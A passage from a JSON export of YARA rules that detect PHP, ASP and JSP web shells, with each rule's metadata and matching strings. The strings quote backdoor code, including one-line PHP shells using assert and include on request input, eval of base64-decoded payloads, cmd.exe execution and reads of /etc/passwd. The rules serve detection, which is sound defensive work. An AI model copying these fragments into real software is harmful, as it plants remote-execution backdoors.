minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))\" fullword\n      $s2 = \"<pre><form action=\\\"<? echo $PHP_SELF; ?>\\\" METHOD=GET >execute command: <input \" \n   condition: \n      all of them\n}","date":"2014-01-28 12:02:51","description":"Web Shell - file php-backdoor.php","minimum_yara":"1.7","name":"Webshell_php_backdoor_RID2F92","reference":"-","required_modules":[],"rule_hash":"82878dc03734da21b040151b7f8cfe75","score":70,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_asp_dabao_RID2E40 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file dabao.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:06:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \" Echo \\\"<input type=button name=Submit onclick=\\\"\\\"document.location =&#039;\\\" &\" \n      $s8 = \" Echo \\\"document.Frm_Pack.FileName.value=\\\"\\\"\\\"\\\"+year+\\\"\\\"-\\\"\\\"+(month+1)+\\\"\\\"-\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:06:31","description":"Web Shell - file dabao.asp","minimum_yara":"1.7","name":"Webshell_asp_dabao_RID2E40","reference":"-","required_modules":[],"rule_hash":"23aa8ab104fd5fc7748d9f66546dda0e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_2_RID2C7F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:51:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php assert($_REQUEST[\\\"c\\\"]);?> \" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 09:51:41","description":"Web Shell - file 2.php","minimum_yara":"1.7","name":"Webshell_php_2_RID2C7F","reference":"-","required_modules":[],"rule_hash":"4c64e457343e4b211d8c615a22c044e0","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_cmdasp_RID2EC1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmdasp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:28:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%= \\\"\\\\\\\\\\\" & oScriptNet.ComputerName & \\\"\\\\\\\" & oScriptNet.UserName %>\" fullword\n      $s7 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:28:01","description":"Web Shell - file cmdasp.asp","minimum_yara":"1.7","name":"Webshell_asp_cmdasp_RID2EC1","reference":"-","required_modules":[],"rule_hash":"eda45608fabb5617dce501130936941c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_spjspshell_RID2EEE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file spjspshell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:35:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\\\winnt\\\\system32\\\\cmd.exe /c type c:\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:35:31","description":"Web Shell - file spjspshell.jsp","minimum_yara":"1.7","name":"Webshell_spjspshell_RID2EEE","reference":"-","required_modules":[],"rule_hash":"43cd4c2709c9ec0b2969806db906eb28","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_action_RID2ED0 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file action.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:30:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"String url=\\\"jdbc:oracle:thin:@localhost:1521:orcl\\\";\" fullword\n      $s6 = \"<%@ page contentType=\\\"text/html;charset=gb2312\\\"%>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:30:31","description":"Web Shell - file action.jsp","minimum_yara":"1.7","name":"Webshell_jsp_action_RID2ED0","reference":"-","required_modules":[],"rule_hash":"1a449f2028f4ac9312cebb937318ba27","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Inderxer_RID2DE7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Inderxer.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:51:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"<td>Nereye :<td><input type=\\\"text\\\" name=\\\"nereye\\\" size=25></td><td><input typ\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:51:41","description":"Web Shell - file Inderxer.asp","minimum_yara":"1.7","name":"Webshell_Inderxer_RID2DE7","reference":"-","required_modules":[],"rule_hash":"466afb4b556a3ed903ea52af91df2343","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_Rader_RID2E37 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Rader.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0\" \n      $s3 = \"m\\\" target=inf onClick=\\\"window.open('?action=help','inf','width=450,height=400 \" \n   condition: \n      all of them\n}","date":"2014-01-28 11:05:01","description":"Web Shell - file Rader.asp","minimum_yara":"1.7","name":"Webshell_asp_Rader_RID2E37","reference":"-","required_modules":[],"rule_hash":"6024973eb718117b1f98a8c2711e626b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99_madnet_smowu_RID30ED : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file smowu.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:00:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"//Authentication\" fullword\n      $s1 = \"$login = \\\"\" fullword\n      $s2 = \"eval(gzinflate(base64_decode('\" \n      $s4 = \"//Pass\" \n      $s5 = \"$md5_pass = \\\"\" \n      $s6 = \"//If no pass then hash\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:00:41","description":"Web Shell - file smowu.php","minimum_yara":"1.7","name":"Webshell_c99_madnet_smowu_RID30ED","reference":"-","required_modules":[],"rule_hash":"46f96345db2a86d2ab3872c134dd1df8","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_moon_RID2E06 : DEMO T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file moon.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo '<option value=\\\"create function backshell returns string soname\" \n      $s3 = \"echo      \\\"<input name='p' type='text' size='27' value='\\\".dirname(_FILE_).\\\"\" \n      $s8 = \"echo '<option value=\\\"select cmdshell(\\\\'net user \" \n   condition: \n      2 of them\n}","date":"2014-01-28 10:56:51","description":"Web Shell - file moon.php","minimum_yara":"1.7","name":"Webshell_php_moon_RID2E06","reference":"-","required_modules":[],"rule_hash":"9d33e86413a04a83a3aa69bb50f0ea5f","score":70,"tags":["T1100","DEMO","WEBSHELL","T1087"]},{"author":"Florian Roth","content":"rule Webshell_minupload_RID2E6F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file minupload.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:14:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input type=\\\"submit\\\" name=\\\"btnSubmit\\\" value=\\\"Upload\\\">   \" fullword\n      $s9 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:14:21","description":"Web Shell - file minupload.jsp","minimum_yara":"1.7","name":"Webshell_minupload_RID2E6F","reference":"-","required_modules":[],"rule_hash":"65b0eac150bb42a1300e23e51be0401a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ELMALISEKER_Backd00r_RID30DA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ELMALISEKER Backd00r.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:57:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write(\\\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio\" \n      $s2 = \"if FP = \\\"RefreshFolder\\\" or request.form(\\\"cmdOption\\\")=\\\"DeleteFolder\\\" or req\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:57:31","description":"Web Shell - file ELMALISEKER Backd00r.asp","minimum_yara":"1.7","name":"Webshell_ELMALISEKER_Backd00r_RID30DA","reference":"-","required_modules":[],"rule_hash":"2b097be5d7b869a17e420b8d6ffaf68b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_h4ntu_shell_powered_by_tsoi__RID361C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file h4ntu shell [powered by tsoi].php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 16:41:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"  <TD><DIV STYLE=\\\"font-family: verdana; font-size: 10px;\\\"><b>Server Adress:</b\" \n      $s3 = \"  <TD><DIV STYLE=\\\"font-family: verdana; font-size: 10px;\\\"><b>User Info:</b> ui\" \n      $s4 = \"    <TD><DIV STYLE=\\\"font-family: verdana; font-size: 10px;\\\"><?= $info ?>: <?= \" \n      $s5 = \"<INPUT TYPE=\\\"text\\\" NAME=\\\"cmd\\\" value=\\\"<?php echo stripslashes(htmlentities($\" \n   condition: \n      all of them\n}","date":"2014-01-28 16:41:51","description":"Web Shell - file h4ntu shell [powered by tsoi].php","minimum_yara":"1.7","name":"Webshell_h4ntu_shell_powered_by_tsoi__RID361C","reference":"-","required_modules":[],"rule_hash":"4c8b83c32a3e3da359ca45f505d5ad7b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_RID3866 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 18:19:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"die(\\\"\\\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\\\n\" \n      $s1 = \"Mode Shell v1.0</font></span></a></font><font face=\\\"Webdings\\\" size=\\\"6\\\" color\" \n   condition: \n      1 of them\n}","date":"2014-01-28 18:19:31","description":"Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php","minimum_yara":"1.7","name":"Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_RID3866","reference":"-","required_modules":[],"rule_hash":"33eafe8c869fc7c5d1dc8a8e6341df4b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend_RID3A73 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 19:47:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo\" \n      $s3 = \"fputs ($fp ,\\\"\\\\n*********************************************\\\\nWelcome T0 Sim\" \n   condition: \n      1 of them\n}","date":"2014-01-28 19:47:01","description":"Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php","minimum_yara":"1.7","name":"Webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend_RID3A73","reference":"-","required_modules":[],"rule_hash":"15f969f53299f8c220b2082d6d230355","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_cmd_RID2D7D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%= \\\"\\\\\\\\\\\" & oScriptNet.ComputerName & \\\"\\\\\\\" & oScriptNet.UserName %>\" fullword\n      $s1 = \"Set oFileSys = Server.CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword\n      $s3 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 10:34:01","description":"Web Shell - file cmd.asp","minimum_yara":"1.7","name":"Webshell_asp_cmd_RID2D7D","reference":"-","required_modules":[],"rule_hash":"02bb3a4ffd84c27eddb801f4071a17f6","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpshell3_RID2E39 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file phpshell3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:05:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<input name=\\\"nounce\\\" type=\\\"hidden\\\" value=\\\"<?php echo $_SESSION['nounce'];\" \n      $s5 = \"<p>Username: <input name=\\\"username\\\" type=\\\"text\\\" value=\\\"<?php echo $userna\" \n      $s7 = \"$_SESSION['output'] .= \\\"cd: could not change to: $new_dir\\\\n\\\";\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 11:05:21","description":"Web Shell - file phpshell3.php","minimum_yara":"1.7","name":"Webshell_phpshell3_RID2E39","reference":"-","required_modules":[],"rule_hash":"5224126cde08d3954dd095fefa9b909d","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_B374kPHP_B374k_RID2E83 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file B374k.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Http://code.google.com/p/b374k-shell\" fullword\n      $s1 = \"$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'\" \n      $s3 = \"Jayalah Indonesiaku & Lyke @ 2013\" fullword\n      $s4 = \"B374k Vip In Beautify Just For Self\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 11:17:41","description":"Web Shell - file B374k.php","minimum_yara":"1.7","name":"Webshell_B374kPHP_B374k_RID2E83","reference":"-","required_modules":[],"rule_hash":"ab254e2f3711e46747cad42b0a12af46","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_bug_1__RID2E1A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file bug (1).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:00:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@include($_GET['bug']);\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:00:11","description":"Web Shell - file bug (1).php","minimum_yara":"1.7","name":"Webshell_PHP_bug_1__RID2E1A","reference":"-","required_modules":[],"rule_hash":"7dbb92ca492e5a8adde049c6c29c1696","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_caidao_shell_hkmjj_RID31F1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file hkmjj.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:44:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"codeds=\\\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\\\"  \" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 13:44:01","description":"Web Shell - file hkmjj.asp","minimum_yara":"1.7","name":"Webshell_caidao_shell_hkmjj_RID31F1","reference":"-","required_modules":[],"rule_hash":"4494f7bf8503abbdbf168183c3a488fc","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_asd_RID2D8A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file asd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:36:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<%@ page language=\\\"java\\\" pageEncoding=\\\"gbk\\\"%>\" fullword\n      $s6 = \"<input size=\\\"100\\\" value=\\\"<%=application.getRealPath(\\\"/\\\") %>\\\" name=\\\"url\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:36:11","description":"Web Shell - file asd.jsp","minimum_yara":"1.7","name":"Webshell_jsp_asd_RID2D8A","reference":"-","required_modules":[],"rule_hash":"1baba7b0759700a2b652ac0fd48f7dc3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_metaslsoft_RID2EE8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file metaslsoft.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:34:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"$buff .= \\\"<tr><td><a href=\\\\\\\"?d=\\\".$pwd.\\\"\\\\\\\">[ $folder ]</a></td><td>LINK</t\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:34:31","description":"Web Shell - file metaslsoft.php","minimum_yara":"1.7","name":"Webshell_metaslsoft_RID2EE8","reference":"-","required_modules":[],"rule_hash":"18ae2ec019e2f92d590eec5e8ab101e1","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_tool_RID2DA7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file tool.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:41:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Response.Write \\\"<FORM action=\\\"\\\"\\\" & Request.ServerVariables(\\\"URL\\\") & \\\"\\\"\\\"\" \n      $s3 = \"Response.Write \\\"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\\\" \" \n      $s9 = \"Response.Write \\\"<font face='arial' size='1'><a href=\\\"\\\"#\\\"\\\" onclick=\\\"\\\"javas\" \n   condition: \n      2 of them\n}","date":"2014-01-28 10:41:01","description":"Web Shell - file tool.asp","minimum_yara":"1.7","name":"Webshell_ASP_tool_RID2DA7","reference":"-","required_modules":[],"rule_hash":"d1538ad5380aa67886cdbf7ed8bd128c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpkit_0_1a_odd_RID304C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file odd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:33:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"include('php://input');\" fullword\n      $s3 = \"ini_set('allow_url_include, 1'); // Allow url inclusion in this script\" fullword\n      $s4 = \"// uses include('php://input') to execute arbritary code\" fullword\n      $s5 = \"// php://input based backdoor\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 12:33:51","description":"Web Shell - file odd.php","minimum_yara":"1.7","name":"Webshell_phpkit_0_1a_odd_RID304C","reference":"-","required_modules":[],"rule_hash":"1da2e5847098d6a332563b9c93bc42a0","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_Shell_x3_RID2EEF : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PHP Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:35:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"&nbsp;&nbsp;<?php echo buildUrl(\\\"<font color=\\\\\\\"navy\\\\\\\">[\" \n      $s6 = \"echo \\\"</form><form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"post\\\\\\\"><input\" \n      $s9 = \"if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset(\" \n   condition: \n      2 of them\n}","date":"2014-01-28 11:35:41","description":"Web Shell - file PHP Shell.php","minimum_yara":"1.7","name":"Webshell_PHP_Shell_x3_RID2EEF","reference":"-","required_modules":[],"rule_hash":"4c372c1fdf23c566c53b27706b867e30","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_RID41E9 : DEMO T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 01:05:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<option value=\\\"cat /etc/passwd\\\">/etc/passwd</option>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 01:05:21","description":"Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php","minimum_yara":"1.7","name":"Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_RID41E9","reference":"-","required_modules":[],"rule_hash":"fa25ccb0d0bcd794f9fe062ae895991b","score":70,"tags":["T1100","DEMO","WEBSHELL","T1087"]},{"author":"Florian Roth","content":"rule Webshell_Macker_s_Private_PHPShell_RID3444 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Macker's Private PHPShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:23:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"echo \\\"<tr><td class=\\\\\\\"silver border\\\\\\\">&nbsp;<strong>Server's PHP Version:&n\" \n      $s4 = \"&nbsp;&nbsp;<?php echo buildUrl(\\\"<font color=\\\\\\\"navy\\\\\\\">[\" \n      $s7 = \"echo \\\"<form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"POST\\\\\\\"><input type=\" \n   condition: \n      all of them\n}","date":"2014-01-28 15:23:11","description":"Web Shell - file Macker's Private PHPShell.php","minimum_yara":"1.7","name":"Webshell_Macker_s_Private_PHPShell_RID3444","reference":"-","required_modules":[],"rule_hash":"f670add79de4481d9b4e04da40738df5","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_Ajan_RID2DC3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Ajan.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:45:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"entrika.write \\\"BinaryStream.SaveToFile \\\"\\\"c:\\\\downloaded.zip\\\"\\\", adSaveCreate\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:45:41","description":"Web Shell - file Ajan.asp","minimum_yara":"1.7","name":"Webshell_asp_Ajan_RID2DC3","reference":"-","required_modules":[],"rule_hash":"fa2ae5d2c0868cd81f99612a075274de","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_config_myxx_zend_RID3161 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files config.jsp, myxx.jsp, zend.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:20:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \".println(\\\"<a href=\\\\\\\"javascript:alert('You Are In File Now ! Can Not Pack !');\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:20:01","description":"Web Shell - from files 